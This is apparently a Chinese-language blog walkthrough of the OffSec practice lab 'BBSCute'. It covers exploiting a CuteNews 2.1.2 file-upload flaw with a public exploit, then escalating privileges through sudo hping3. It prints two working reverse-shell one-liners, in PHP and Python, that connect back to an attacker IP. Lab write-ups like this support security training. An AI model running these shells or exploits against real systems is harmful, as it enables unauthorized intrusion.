---
title: offsec-Lab-BBSCute
date: 2023-08-08 10:48:52
categories: 
- 靶场WriteUP
tags:
- 靶场WriteUP
- OffSec
cover: ../images/icon/offsec_cover.png
---

扫描之后看到开放端口有22和80，直接打开80端口。

![image-20230808110110480](../images/offsec-Lab-BBSCute/image-20230808110110480.png)

发现是Apache2 Debian默认页面

![image-20230808110206706](../images/offsec-Lab-BBSCute/image-20230808110206706.png)



路径扫描发现存在index.php，打开后看到是CuteNwes2.1.2

![image-20230808110348727](../images/offsec-Lab-BBSCute/image-20230808110348727.png)

搜索和cutenews相关的漏洞。`searchsploit cutenews`

可以看到有和2.1.2相关的漏洞。用`searchsploit -m`下载下来

![image-20230808110541085](../images/offsec-Lab-BBSCute/image-20230808110541085.png)

查看漏洞详情，是一个文件上传漏洞。

![image-20230808111052022](../images/offsec-Lab-BBSCute/image-20230808111052022.png)

首先注册一个用户，注册的时候看不到验证码，可以F12查看network，再次刷新的时候看到验证码，复制过去就可以注册。

![image-20230808111848885](../images/offsec-Lab-BBSCute/image-20230808111848885.png)

上传漏洞点在更改用户头像的地方，可以手动注入。



这里使用EXP  48800.py进行渗透，在输入攻击url后没有拿到shell。

于是看一下提供的exp。

![image-20230808111512913](../images/offsec-Lab-BBSCute/image-20230808111512913.png)

可以看到这里路径和我们攻击目标的路径不太一样，把这个删了之后重新使用exp。

成功拿到shell。然后用以下代码反弹shell。

```bash
php -r '$sock=fsockopen("192.168.45.163",2333);system("/bin/bash <&3 >&3 2>&3");’
```

home下面的user.txt提示我们flag在另外的地方

![image-20230808112154182](../images/offsec-Lab-BBSCute/image-20230808112154182.png)

最后找到在/var/www路径中

![image-20230808112310848](../images/offsec-Lab-BBSCute/image-20230808112310848.png)





# 提权

![image-20230808112327381](../images/offsec-Lab-BBSCute/image-20230808112327381.png)

在https://gtfobins.github.io/gtfobins/hping3/中找到提权的利用方法。

但是在反弹shell中利用的时候一直报错，因为只支持`sudo hping3 --icmp`格式，格式稍微改变一下就不对，因此在这里一直卡住。

后来发现是反弹shell不对，然后换了一个反弹的方式：

```bash
export RHOST="192.168.45.163";export RPORT=2333;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")’
```

接下来就可以成功提权了

![image-20230808112720732](../images/offsec-Lab-BBSCute/image-20230808112720732.png)

得到root flag

![image-20230808112741942](../images/offsec-Lab-BBSCute/image-20230808112741942.png)
